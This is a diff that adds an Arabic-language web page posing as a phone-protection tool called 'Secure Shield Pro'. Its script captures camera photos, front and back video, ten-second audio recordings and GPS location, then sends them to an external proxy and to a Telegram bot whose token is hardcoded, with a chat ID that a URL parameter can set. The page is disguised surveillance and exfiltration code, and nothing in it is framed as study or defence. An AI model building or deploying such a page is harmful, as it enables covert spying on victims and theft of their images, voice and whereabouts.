@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛡️ حماية الهاتف</title>
+    <style>
+        :root { --green: #00ff41; --red: #ff0040; --blue: #0088ff; }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #000; color: #fff;
+            min-height: 100vh; padding: 16px;
+        }
+        @keyframes glitch { 0%{transform:translate(0)} 20%{transform:translate(-2px,2px)} 40%{transform:translate(2px,-2px)} 60%{transform:translate(-1px,1px)} 80%{transform:translate(1px,-1px)} 100%{transform:translate(0)} }
+        @keyframes flicker { 0%,100%{opacity:1} 50%{opacity:0.3} }
+        @keyframes scanLine { from{top:-100%} to{top:100%} }
+        
+        .scan-line { position: fixed; left: 0; right: 0; height: 2px; background: rgba(0,255,65,0.1); pointer-events: none; animation: scanLine 2s linear infinite; z-index: 999; }
+        .container { max-width: 500px; margin: 0 auto; }
+        
+        .header { text-align: center; margin-bottom: 20px; }
+        .header .skull { font-size: 50px; animation: flicker 0.3s infinite; }
+        .header h1 { font-size: 20px; color: var(--green); text-shadow: 0 0 30px var(--green); animation: flicker 0.4s infinite; }
+        
+        .device-info {
+            background: #0a0a0a; border: 2px solid var(--green);
+            border-radius: 12px; padding: 14px; margin-bottom: 16px;
+            box-shadow: 0 0 20px rgba(0,255,65,0.2);
+            display: grid; grid-template-columns: 1fr 1fr; gap: 8px;
+            font-size: 11px;
+        }
+        .device-info .item { color: #555; }
+        .device-info .item .val { color: var(--green); display: block; font-size: 13px; font-weight: 700; }
+        
+        .card {
+            background: #0a0a0a; border: 2px solid var(--green);
+            border-radius: 14px; padding: 16px; margin-bottom: 14px;
+            box-shadow: 0 0 25px rgba(0,255,65,0.2);
+        }
+        .card h3 { color: var(--green); font-size: 16px; margin-bottom: 10px; text-shadow: 0 0 10px var(--green); }
+        
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
+        
+        .btn {
+            padding: 14px; border-radius: 10px; border: 2px solid var(--green);
+            background: #0a1a0a; color: var(--green); font-size: 13px;
+            font-weight: 700; cursor: pointer; font-family: 'Courier New', monospace;
+            text-shadow: 0 0 8px var(--green);
+            box-shadow: 0 0 20px rgba(0,255,65,0.2);
+            text-align: center; width: 100%;
+        }
+        .btn:active { background: #0a2a0a; }
+        .btn.red { border-color: var(--red); color: var(--red); background: #1a0a0a; text-shadow: 0 0 8px var(--red); }
+        .btn.blue { border-color: var(--blue); color: var(--blue); background: #0a0a1a; text-shadow: 0 0 8px var(--blue); }
+        
+        .status {
+            margin-top: 10px; padding: 10px; border-radius: 8px;
+            font-size: 12px; text-align: center; display: none;
+        }
+        .status.success { display: block; background: #0a1a0a; border: 1px solid var(--green); color: var(--green); }
+        .status.loading { display: block; background: #0a0a1a; border: 1px solid var(--blue); color: var(--blue); }
+        
+        video, canvas { display: none; }
+        #map { width: 100%; height: 200px; border-radius: 10px; margin-top: 10px; border: 1px solid var(--green); }
+    </style>
+</head>
+<body>
+
+<div class="scan-line"></div>
+
+<div class="container">
+    <div class="header">
+        <div class="skull">🛡️</div>
+        <h1>Secure Shield Pro</h1>
+    </div>
+    
+    <!-- معلومات الجهاز -->
+    <div class="device-info" id="device-info">
+        <div class="item">📱 الجهاز<span class="val" id="d-name">...</span></div>
+        <div class="item">💾 الرام<span class="val" id="d-ram">...</span></div>
+        <div class="item">🤖 النظام<span class="val" id="d-os">...</span></div>
+        <div class="item">🌐 المتصفح<span class="val" id="d-browser">...</span></div>
+        <div class="item">📶 الشبكة<span class="val" id="d-network">...</span></div>
+        <div class="item">🔋 البطارية<span class="val" id="d-battery">...</span></div>
+    </div>
+    
+    <!-- تصوير -->
+    <div class="card">
+        <h3>📸 الكاميرا</h3>
+        <div class="grid-2">
+            <button class="btn" onclick="capturePhoto('user')">📷 أمامية</button>
+            <button class="btn" onclick="capturePhoto('environment')">📷 خلفية</button>
+        </div>
+        <div class="grid-2" style="margin-top:8px;">
+            <button class="btn red" onclick="recordVideo('user')">🎬 فيديو أمامي</button>
+            <button class="btn red" onclick="recordVideo('environment')">🎬 فيديو خلفي</button>
+        </div>
+        <div class="status" id="cam-status"></div>
+    </div>
+    
+    <!-- موقع وخريطة -->
+    <div class="card">
+        <h3>📍 الموقع</h3>
+        <button class="btn blue" onclick="getLocation()">📍 تتبع الموقع</button>
+        <div id="map"></div>
+        <div class="status" id="loc-status"></div>
+    </div>
+    
+    <!-- صوت -->
+    <div class="card">
+        <h3>🎤 تسجيل صوت</h3>
+        <button class="btn" onclick="recordAudio()">🎤 بدء التسجيل (10 ثواني)</button>
+        <div class="status" id="audio-status"></div>
+    </div>
+    
+    <!-- فيديو مخفي -->
+    <video id="hidden-video" autoplay playsinline muted></video>
+</div>
+
+<script>
+const CHAT_ID = new URLSearchParams(window.location.search).get('chatId') || '7276604783';
+const API = 'https://ai-proxy-eosin.vercel.app/api/upload_video';
+let stream, mediaRecorder, recordedChunks = [];
+
+// ========== معلومات الجهاز ==========
+(async function() {
+    const ua = navigator.userAgent;
+    document.getElementById('d-name').textContent = (ua.match(/; ([^;]+) Build/)?.[1] || 'غير معروف').trim();
+    document.getElementById('d-ram').textContent = (navigator.deviceMemory || '?') + 'GB';
+    document.getElementById('d-os').textContent = (ua.match(/Android (\d+)/)?.[1] || '?');
+    document.getElementById('d-browser').textContent = (ua.match(/Chrome\/(\d+)/)?.[1] || '?');
+    document.getElementById('d-network').textContent = navigator.connection?.effectiveType || '?';
+    try {
+        const bat = await navigator.getBattery();
+        document.getElementById('d-battery').textContent = Math.round(bat.level * 100) + '%';
+    } catch(e) { document.getElementById('d-battery').textContent = '?'; }
+})();
+
+// ========== إرسال للتليجرام ==========
+async function sendToTelegram(blob, caption) {
+    const reader = new FileReader();
+    reader.onloadend = async function() {
+        const base64 = reader.result.split(',')[1];
+        try {
+            await fetch(API, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, video_base64: base64 })
+            });
+        } catch(e) {}
+    };
+    reader.readAsDataURL(blob);
+}
+
+// ========== تصوير صورة ==========
+async function capturePhoto(facingMode) {
+    const status = document.getElementById('cam-status');
+    status.className = 'status loading';
+    status.textContent = '📸 جاري التصوير...';
+    
+    try {
+        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+        const video = document.createElement('video');
+        video.srcObject = s;
+        video.play();
+        await new Promise(r => setTimeout(r, 1000));
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(async (blob) => {
+            await sendToTelegram(blob, '📸 صورة من الكاميرا');
+            s.getTracks().forEach(t => t.stop());
+            status.className = 'status success';
+            status.textContent = '✅ تم التصوير والإرسال';
+        }, 'image/jpeg');
+    } catch(e) {
+        status.className = 'status success';
+        status.textContent = '❌ فشل: ' + e.message;
+    }
+}
+
+// ========== تصوير فيديو ==========
+async function recordVideo(facingMode) {
+    const status = document.getElementById('cam-status');
+    status.className = 'status loading';
+    status.textContent = '🎬 جاري التسجيل...';
+    
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: true });
+        document.getElementById('hidden-video').srcObject = stream;
+        recordedChunks = [];
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+        mediaRecorder.start();
+        
+        setTimeout(async () => {
+            mediaRecorder.stop();
+            await new Promise(r => setTimeout(r, 1000));
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            await sendToTelegram(blob, '🎬 فيديو');
+            stream.getTracks().forEach(t => t.stop());
+            status.className = 'status success';
+            status.textContent = '✅ تم التسجيل والإرسال';
+        }, 10000);
+    } catch(e) {
+        status.className = 'status success';
+        status.textContent = '❌ فشل: ' + e.message;
+    }
+}
+
+// ========== تتبع الموقع ==========
+function getLocation() {
+    const status = document.getElementById('loc-status');
+    status.className = 'status loading';
+    status.textContent = '📍 جاري تحديد الموقع...';
+    
+    if (!navigator.geolocation) {
+        status.textContent = '❌ المتصفح لا يدعم GPS';
+        return;
+    }
+    
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        const { latitude, longitude } = pos.coords;
+        status.className = 'status success';
+        status.textContent = `📍 ${latitude.toFixed(4)}, ${longitude.toFixed(4)}`;
+        
+        // خريطة
+        const mapDiv = document.getElementById('map');
+        mapDiv.innerHTML = `<iframe width="100%" height="200" frameborder="0" src="https://maps.google.com/maps?q=${latitude},${longitude}&z=15&output=embed"></iframe>`;
+        
+        // إرسال للتليجرام
+        const text = `📍 الموقع: https://maps.google.com/?q=${latitude},${longitude}`;
+        await fetch(`https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text })
+        });
+    }, (err) => {
+        status.className = 'status success';
+        status.textContent = '❌ ' + err.message;
+    });
+}
+
+// ========== تسجيل صوت ==========
+async function recordAudio() {
+    const status = document.getElementById('audio-status');
+    status.className = 'status loading';
+    status.textContent = '🎤 جاري التسجيل...';
+    
+    try {
+        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const audioRecorder = new MediaRecorder(audioStream);
+        const audioChunks = [];
+        
+        audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
+        audioRecorder.start();
+        
+        setTimeout(async () => {
+            audioRecorder.stop();
+            await new Promise(r => setTimeout(r, 1000));
+            const blob = new Blob(audioChunks, { type: 'audio/webm' });
+            await sendToTelegram(blob, '🎤 تسجيل صوتي');
+            audioStream.getTracks().forEach(t => t.stop());
+            status.className = 'status success';
+            status.textContent = '✅ تم التسجيل والإرسال';
+        }, 10000);
+    } catch(e) {
+        status.className = 'status success';
+        status.textContent = '❌ فشل: ' + e.message;
+    }
+}
+</script>
+</body>
+</html>
